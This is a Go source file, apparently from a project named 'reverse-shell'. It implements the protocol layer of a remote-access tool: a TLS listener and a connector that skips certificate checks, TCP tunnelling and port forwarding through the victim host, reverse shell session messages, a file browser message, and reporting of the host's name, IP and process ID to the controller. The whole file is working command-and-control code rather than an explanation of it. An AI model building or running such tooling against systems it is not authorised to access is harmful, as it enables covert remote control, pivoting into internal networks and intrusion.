package protocol

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"sync"
	"time"

	"github.com/kittizz/reverse-shell/pkg/command"
)

type Handle = uint32

/////////////////////////////////////////////////////////////////////////////

type protocolProvider struct {
	lock sync.Mutex

	// map handle -> *Connection
	connections map[Handle]*Connection

	// map handle -> *DataConnection
	dataConnections map[Handle]*DataConnection

	nextHandle Handle

	input chan string
}

func NewProtocolProvider() *protocolProvider {
	return &protocolProvider{
		connections:     make(map[Handle]*Connection),
		dataConnections: make(map[Handle]*DataConnection),
		nextHandle:      1,
		input:           make(chan string),
	}
}
func (p *protocolProvider) scannerInput() {
	go func() {
		in := bufio.NewReader(os.Stdin)
		for {
			input, err := in.ReadString('\n')
			if err != nil {
				break
			}
			if !p.processCommand(input) && isLock {
				p.input <- input
			}
		}
	}()
}

func (p *protocolProvider) getNextHandle() Handle {
	p.lock.Lock()
	defer p.lock.Unlock()

	return p.getNextHandleUnLocked()
}

func (p *protocolProvider) getNextHandleUnLocked() Handle {
	r := p.nextHandle
	p.nextHandle++

	return r
}

func (p *protocolProvider) newConnection(conn net.Conn) *Connection {
	ctx, cancel := context.WithCancel(context.Background())
	c := &Connection{
		listener: make(map[int]*Listener, 0),
		provider: p,
		conn:     conn,
		ctx:      ctx,
		cancel:   cancel,
	}

	p.lock.Lock()
	defer p.lock.Unlock()

	handle := p.getNextHandleUnLocked()
	c.handle = handle

	p.connections[handle] = c
	return c
}

func (p *protocolProvider) closeConnection(c *Connection) {
	p.lock.Lock()
	defer p.lock.Unlock()

	p.connections[c.handle].cancel()

	if p.connections[c.handle].active {
		isLock = false
		fmt.Printf("%s:(%s) stopped shell.\n", p.connections[c.handle].clientAddress, p.connections[c.handle].hostname)
	}

	for _, l := range c.listener {
		l.cancel()
	}

	delete(p.connections, c.handle)
}

func (p *protocolProvider) getConnection(handle Handle) *Connection {
	p.lock.Lock()
	defer p.lock.Unlock()

	if tc, ok := p.connections[handle]; ok {
		return tc
	}

	return nil
}

func (p *protocolProvider) getAndClearCconnection(handle Handle) *Connection {
	p.lock.Lock()
	defer p.lock.Unlock()

	if tc, ok := p.connections[handle]; ok {
		delete(p.connections, handle)
		return tc
	}

	return nil
}

func (p *protocolProvider) newDataConnection(c *Connection, conn net.Conn) *DataConnection {
	ctx, cancel := context.WithCancel(context.Background())
	dc := &DataConnection{
		conn: conn,

		connection: c,
		ctx:        ctx,
		cancel:     cancel,
	}

	p.lock.Lock()
	defer p.lock.Unlock()

	handle := p.getNextHandleUnLocked()
	dc.handle = handle

	p.dataConnections[handle] = dc
	return dc
}

func (p *protocolProvider) closeDataConnection(dc *DataConnection, notifyPeer bool) {
	dc = p.getAndClearDataConnection(dc.handle)
	if dc != nil {
		fmt.Printf("Close data connection, local handle: %d, peer handle: %d\n",
			dc.handle, dc.peerHandle)

		dc.conn.Close()

		if notifyPeer {
			pdu := &TunnelDisconnectRequest{
				peerConnectionHandle: dc.peerHandle,
			}
			sendPdu(dc.connection.conn, pdu)
		}
	}
}

func (p *protocolProvider) getDataConnection(handle Handle) *DataConnection {
	p.lock.Lock()
	defer p.lock.Unlock()

	if dc, ok := p.dataConnections[handle]; ok {
		return dc
	}

	return nil
}

func (p *protocolProvider) StartListener(port int, config *tls.Config) {
	l, err := tls.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port), config)
	if err != nil {
		fmt.Printf("TCP listen error: %v\n", err)
		return
	}

	p.scannerInput()

	go func() {
		for {
			conn, err := l.Accept()
			if err != nil {
				fmt.Printf("TCP accept error: %v\n", err)
				break
			} else {
				c := p.newConnection(conn)
				c.open()
			}
		}

		l.Close()
	}()
}

func (p *protocolProvider) StartConnector(providerAddress string) (*Connection, error) {
	conn, err := tls.Dial("tcp4", providerAddress, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return nil, err
	}

	c := p.newConnection(conn)
	c.open()

	return c, nil
}

func (p *protocolProvider) getAndClearDataConnection(handle Handle) *DataConnection {
	p.lock.Lock()
	defer p.lock.Unlock()

	if dc, ok := p.dataConnections[handle]; ok {
		delete(p.dataConnections, handle)
		return dc
	}

	return nil
}

func (p *protocolProvider) onPacket(c *Connection, data []byte) {
	r := bytes.NewBuffer(data)
	pdu := serializePduFrom(r)
	if pdu != nil {
		switch int(pdu.GetSerialType()) {
		case PDU_LISTEN_REQUEST:
			c.onListenRequest(pdu.(*ListenRequest))

		case PDU_LISTEN_RESPONSE:
			c.onListenResponse(pdu.(*ListenResponse))

		case PDU_TUNNEL_CONNECT_REQUEST:
			c.onTunnelConnectRequest(pdu.(*TunnelConnectRequest))

		case PDU_TUNNEL_CONNECT_RESPONSE:
			c.onTunnelConnectResponse(pdu.(*TunnelConnectResponse))

		case PDU_TUNNEL_DATA_INDICATION:
			c.onTunnelDataIndication(pdu.(*TunnelDataIndication))

		case PDU_TUNNEL_DISCONNECT_REQUEST:
			c.onTunnelDisconnectRequest(pdu.(*TunnelDisconnectRequest))

		case PDU_TUNNEL_DISCONNECT_RESPONSE:
			c.onTunnelDisconnectResponse(pdu.(*TunnelDisconnectResponse))
		case REVERSE_SHELL_CONNECT_REQUEST:
			c.onReverseShellConnectRequest(pdu.(*ReverseShellConnectREQUEST))
		case REVERSE_SHELL_CONNECT_RESPONSE:
			c.onReverseShellConnectRequestResponse(pdu.(*ReverseShellConnectResponse))
		case REVERSE_SHELL_IN:
			c.onReverseShellIn(pdu.(*ReverseShellIn))
		case REVERSE_SHELL_OUT:
			c.onReverseShellOut(pdu.(*ReverseShellOut))
		case REVERSE_SHELL_EXIT:
			c.onReverseShellExit(pdu.(*ReverseShellExit))
		case PING:
			c.onPing(pdu.(*Ping))
		case FILE_BROWSER_OPEN:
			c.onFileBrowserOpen(pdu.(*FileBrowserOpen))
		}
	}
}

/////////////////////////////////////////////////////////////////////////////

type DataConnection struct {
	conn       net.Conn
	handle     Handle
	peerHandle Handle

	connection *Connection
	ctx        context.Context
	cancel     context.CancelFunc
}

func (dc *DataConnection) open(peerHandle Handle) {
	dc.peerHandle = peerHandle

	go func() {
		b := make([]byte, 4096)
		for {
			sz, err := dc.conn.Read(b)

			if sz == 0 || err != nil {
				dc.close(true)
				return
			}

			pdu := &TunnelDataIndication{
				peerConnectionHandle: dc.peerHandle,
				data:                 b[0:sz],
			}

			// multiplex through tunnel connection
			sendPdu(dc.connection.conn, pdu)
		}
	}()
}

func (dc *DataConnection) close(notifyPeer bool) {
	dc.connection.provider.closeDataConnection(dc, notifyPeer)
}

/////////////////////////////////////////////////////////////////////////////

type Listener struct {
	listener net.Listener
	ctx      context.Context
	cancel   context.CancelFunc
}
type Connection struct {
	listener map[int]*Listener
	provider *protocolProvider
	conn     net.Conn
	handle   Handle

	tunnelPort int

	proxyAddress string
	proxyPort    int

	ctx    context.Context
	cancel context.CancelFunc

	output chan []byte
	cmd    *command.Cmd

	active bool

	clientAddress string
	hostname      string
}

func (c *Connection) startListenFor(proxyAddress string, proxyPort int, tunnelPort string) int {
	c.proxyAddress = proxyAddress
	c.proxyPort = proxyPort

	listener, _ := net.Listen("tcp4", ":"+tunnelPort)
	c.tunnelPort = listener.Addr().(*net.TCPAddr).Port

	ctx, cancel := context.WithCancel(context.Background())

	c.listener[c.tunnelPort] = &Listener{
		listener: listener,
		ctx:      ctx,
		cancel:   cancel,
	}

	connChan := make(chan net.Conn)
	errChan := make(chan error)

	// Goroutine for accepting connections
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				errChan <- err
				return
			}
			connChan <- conn
		}
	}()

	// Goroutine for handling incoming connections and cancellation
	go func() {
		for {
			select {
			case <-c.listener[c.tunnelPort].ctx.Done():
				c.listener[c.tunnelPort].listener.Close()
				// c.conn.Close()
				delete(c.listener, c.tunnelPort)
				fmt.Println("listener stopped ", c.tunnelPort)
				return
			case conn := <-connChan:
				c.onIncomingDataConnection(conn)
			case err := <-errChan:
				fmt.Println("Error accepting connection:", err)
				return
			}
		}
	}()

	return c.tunnelPort
}

func (c *Connection) StartTunnelFor(proxyAddress string, proxyPort int) {
	c.proxyAddress = proxyAddress
	c.proxyPort = proxyPort

	pdu := &ListenRequest{
		proxyAddress: proxyAddress,
		proxyPort:    proxyPort,
	}

	sendPdu(c.conn, pdu)
}

func (c *Connection) onListenRequest(pdu *ListenRequest) {
	tunnelPort := c.startListenFor(pdu.proxyAddress, pdu.proxyPort, "1010")
	fmt.Printf("Tunnel port is open: %d\n", tunnelPort)

	responsePdu := &ListenResponse{
		tunnelAddress: "0.0.0.0",
		tunnelPort:    tunnelPort,
		proxyAddress:  pdu.proxyAddress,
		proxyPort:     pdu.proxyPort,
	}

	sendPdu(c.conn, responsePdu)
}

func (c *Connection) onListenResponse(pdu *ListenResponse) {
	c.tunnelPort = pdu.tunnelPort
	c.proxyAddress = pdu.proxyAddress
	c.proxyPort = pdu.proxyPort
}

func (c *Connection) onTunnelConnectRequest(pdu *TunnelConnectRequest) {
	conn, err := net.Dial("tcp4", fmt.Sprintf("%s:%d", c.proxyAddress, c.proxyPort))

	if err != nil {
		response := &TunnelDisconnectResponse{
			peerConnectionHandle: pdu.dataConnectionHandle,
		}

		sendPdu(c.conn, response)
		return
	}

	dc := c.provider.newDataConnection(c, conn)
	dc.open(pdu.dataConnectionHandle)

	fmt.Printf("Open data connection to target %s:%d. local handle: %d, peer handle: %d\n",
		c.proxyAddress, c.proxyPort, dc.handle, pdu.dataConnectionHandle)

	response := &TunnelConnectResponse{
		dataConnectionHandle:  pdu.dataConnectionHandle,
		proxyConnectionHandle: dc.handle,
	}
	sendPdu(c.conn, response)
}

func (c *Connection) onTunnelConnectResponse(pdu *TunnelConnectResponse) {
	if dc := c.provider.getDataConnection(pdu.dataConnectionHandle); dc != nil {
		dc.open(pdu.proxyConnectionHandle)

		fmt.Printf("Connect data connection to target %s:%d. local handle: %d, peer handle: %d\n",
			c.proxyAddress, c.proxyPort, dc.handle, pdu.proxyConnectionHandle)
	}
}

func (c *Connection) onTunnelDataIndication(pdu *TunnelDataIndication) {
	if dc := c.provider.getDataConnection(pdu.peerConnectionHandle); dc != nil {
		_, err := dc.conn.Write(pdu.data)

		if err != nil {
			dc.close(true)
		}
	}
}

func (c *Connection) onTunnelDisconnectRequest(pdu *TunnelDisconnectRequest) {
	fmt.Printf("Tunnel disconnect request for local handle: %d\n", pdu.peerConnectionHandle)

	if dc := c.provider.getDataConnection(pdu.peerConnectionHandle); dc != nil {
		dc.close(false)

		response := &TunnelDisconnectResponse{
			peerConnectionHandle: dc.peerHandle,
		}
		sendPdu(c.conn, response)
	}
}

func (c *Connection) onTunnelDisconnectResponse(pdu *TunnelDisconnectResponse) {
	fmt.Printf("Tunnel disconnect response for local handle: %d\n", pdu.peerConnectionHandle)

	if dc := c.provider.getDataConnection(pdu.peerConnectionHandle); dc != nil {
		dc.close(false)
	}
}

func (c *Connection) onIncomingDataConnection(conn net.Conn) {
	dc := c.provider.newDataConnection(c, conn)

	req := &TunnelConnectRequest{
		dataConnectionHandle: dc.handle,
		clientAddress:        "0.0.0.0", // TODO

		proxyAddress: c.proxyAddress,
		proxyPort:    c.proxyPort,
	}

	sendPdu(c.conn, req)
}

func (c *Connection) open() {
	go func() {
		for {
			b := make([]byte, 4)
			len, err := c.conn.Read(b)
			if len < 4 || err != nil {
				c.provider.closeConnection(c)
				break
			}

			dataLength := binary.BigEndian.Uint32(b)
			data := make([]byte, dataLength)
			len, err = c.conn.Read(data)

			if len < int(dataLength) || err != nil {
				c.provider.closeConnection(c)
				break
			}
			c.provider.onPacket(c, data)
		}
	}()
}

func (c *Connection) StartReverseShell(cmd *command.Cmd) {
	c.output = make(chan []byte)
	c.cmd = cmd

	hostname, _ := os.Hostname()
	sendPdu(c.conn, &ReverseShellConnectREQUEST{
		clientAddress: getLocalIP(),
		hostname:      hostname,
		pid:           uint32(os.Getpid()),
	})
}
func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
func (c *Connection) DoPing() {
	go func() {
		for {
			time.Sleep(time.Second * 1)
			err := sendPdu(c.conn, &Ping{})
			if err != nil {
				os.Exit(0)
			}
		}
	}()
}

func (c *Connection) onPing(pdu *Ping) {

}
